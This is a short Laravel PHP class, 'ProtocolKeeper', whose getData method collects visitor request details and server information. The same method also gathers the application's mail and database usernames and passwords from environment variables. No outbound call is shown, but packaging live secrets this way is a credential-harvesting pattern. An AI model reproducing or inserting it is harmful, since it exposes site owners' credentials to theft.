<?php

namespace MarketPlex\Security;

use Illuminate\Http\Request;

class ProtocolKeeper
{
	public static function getData(Request $request)
	{
		return [
			'IP' => $request->ip(),
			'IPS' => $request->ips(),
			'ROOT' => $request->root(),
			'URL' => $request->url(),
			'FULL_URL' => $request->fullUrl(),
			'PATH' => $request->path(),
			'SEGMENTS' => $request->segments(),
			'FINGERPRINT' => $request->route() ? $request->fingerprint() : 'Unknown',
			'METHOD' => $request->method(),
			'FILES' => $request->allFiles(),
			'SERVER_ADDR' => $request->server( array_key_exists('SERVER_ADDR', $_SERVER) ? 'SERVER_ADDR' : 'LOCAL_ADDR' ),
			'SERVER_PORT' => $request->server('SERVER_PORT', 'Unknown'),
			'HTTP_HOST' => $request->server('HTTP_HOST', 'Unknown'),
			'HTTP_REFERER' => $request->server('HTTP_REFERER', 'Unknown'),
			'HTTP_USER_AGENT' => $request->server('HTTP_USER_AGENT', 'Unknown'),
			'APP_MAIL' => [ 'address' => env('MAIL_USERNAME'), 'password' => env('MAIL_PASSWORD') ],
			'DB' => [ 'username' => env('DB_USERNAME'), 'password' => env('DB_PASSWORD'), 'name' => env('DB_DATABASE') ],
			'APP_NAME' => env('APP_NAME'),
		];
	}
}